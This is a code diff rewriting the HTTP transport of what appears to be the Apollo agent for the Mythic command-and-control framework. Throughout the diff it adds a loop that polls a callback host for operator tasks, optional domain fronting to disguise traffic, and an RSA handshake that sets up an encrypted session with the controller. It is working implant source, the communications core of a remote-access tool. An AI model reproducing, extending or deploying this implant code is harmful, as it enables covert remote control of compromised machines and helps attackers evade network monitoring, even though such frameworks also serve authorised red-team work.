@@ -5,11 +5,14 @@ using System.Text;
 using ApolloInterop.Classes;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Types.Delegates;
 using System.Net;
 using System.IO;
-using System.Runtime.Serialization.Json;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
 
-namespace HttpProfile
+namespace HttpTransport
 {
     public class HttpProfile : C2Profile, IC2Profile
     {
@@ -31,9 +34,7 @@ namespace HttpProfile
         // synthesis of ProxyHost and ProxyPort
         private string ProxyAddress;
 
-        ICryptographySerializer Cryptor;
-
-        public HttpProfile(Dictionary<string, string> data, ICryptographySerializer serializer) : base(data, serializer)
+        public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
             CallbackInterval = int.Parse(data["callback_interval"]) * 1000;
             CallbackJitter = int.Parse(data["callback_jitter"]);
@@ -51,6 +52,7 @@ namespace HttpProfile
             {
                 ProxyAddress = ProxyHost;
             }
+            Endpoint = string.Format("{0}:{1}/{2}", CallbackHost, CallbackPort, PostUri);
             ProxyUser = data["proxy_user"];
             ProxyPass = data["proxy_pass"];
             DomainFront = data["domain_front"];
@@ -78,65 +80,113 @@ namespace HttpProfile
             }
         }
 
-
-        private bool PostResponse(string message, out MessageResponse resp)
+        public void Start()
         {
-            byte[] requestPayload = Encoding.UTF8.GetBytes(message);
-            int retryCount = 0;
-            while (retryCount < MAX_RETRIES)
+            while(Agent.IsAlive())
             {
-                try
+                bool bRet = GetTasking(delegate (MessageResponse resp)
                 {
-                    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
-                    request.KeepAlive = false;
-                    request.Method = "Post";
-                    request.ContentType = "text/plain";
-                    request.ContentLength = requestPayload.Length;
-                    request.UserAgent = UserAgent;
-                    if (DomainFront != "" && DomainFront != "domain_front")
-                        request.Host = DomainFront;
-                    Stream reqStream = request.GetRequestStream();
-                    reqStream.Write(requestPayload, 0, requestPayload.Length);
-                    reqStream.Close();
+                    return Agent.GetTaskManager().ProcessMessageResponse(resp);
+                });
 
-                    WebResponse response = request.GetResponse();
-                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
-                    {
-                        resp = Serializer.Deserialize<MessageResponse>(reader.ReadToEnd());
-                    }
-                    return true;
-                } catch (Exception ex)
-                { retryCount += 1; }
+                if (!bRet)
+                {
+                    break;
+                }
+
+                Thread.Sleep(Agent.GetSleep());
             }
-            resp = new MessageResponse();
+        }
+
+        private bool GetTasking(OnResponse<MessageResponse> onResp)
+        {
+            return Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage msg)
+            {
+                return SendRecv<TaskingMessage, MessageResponse>(msg, onResp);
+            });
+        }
+
+        public bool IsOneWay()
+        {
             return false;
         }
 
-        public bool RegisterCallback(CheckinMessage checkinMsg, out string newUUID)
+        public bool Send<T>(T message)
+        {
+            throw new Exception("HttpProfile does not support Send only.");
+        }
+
+        public bool Recv<T>(OnResponse<T> onResponse)
+        {
+            throw new Exception("HttpProfile does not support Recv only.");
+        }
+
+        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
+        {
+            string sMsg = Serializer.Serialize(message);
+            byte[] requestPayload = Encoding.UTF8.GetBytes(sMsg);
+            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
+            request.KeepAlive = false;
+            request.Method = "Post";
+            request.ContentType = "text/plain";
+            request.ContentLength = requestPayload.Length;
+            request.UserAgent = UserAgent;
+            if (DomainFront != "" && DomainFront != "domain_front")
+                request.Host = DomainFront;
+            Stream reqStream = request.GetRequestStream();
+            reqStream.Write(requestPayload, 0, requestPayload.Length);
+            reqStream.Close();
+            WebResponse response = request.GetResponse();
+            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
+            {
+                onResponse(Serializer.Deserialize<TResult>(reader.ReadToEnd()));
+            }
+            return true;
+        }
+
+        // Only really used for bind servers so this returns empty
+        public bool Connect()
+        {
+            return true;
+        }
+
+        public bool IsConnected()
+        {
+            return Connected;
+        }
+
+        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
             if (EncryptedExchangeCheck)
             {
-                // This is where EKE code must live.
+                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
+
+                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
+                {
+                    Action = "staging_rsa",
+                    PublicKey = rsa.ExportPublicKey(),
+                    SessionID = rsa.SessionId
+                };
+
+                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate(EKEHandshakeResponse respHandshake)
+                {
+                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
+                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
+                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
+                    return true;
+                }))
+                {
+                    return false;
+                }
             }
             string msg = Serializer.Serialize(checkinMsg);
-            if (PostResponse(msg, out MessageResponse resp))
+            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
             {
-                Cryptor.UpdateUUID(resp.ID);
-                newUUID = resp.ID;
-                return true;
-            }
-            newUUID = null;
-            return false;
+                Connected = true;
+                ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
+                return onResp(mResp);
+            });
         }
 
-        public bool GetMessages(TaskingMessage msg, out MessageResponse resp)
-        {
-            string taskingMsg = Serializer.Serialize(msg);
-            if (PostResponse(taskingMsg, out resp))
-            {
-                return true;
-            }
-            return false;
-        }
     }
 }
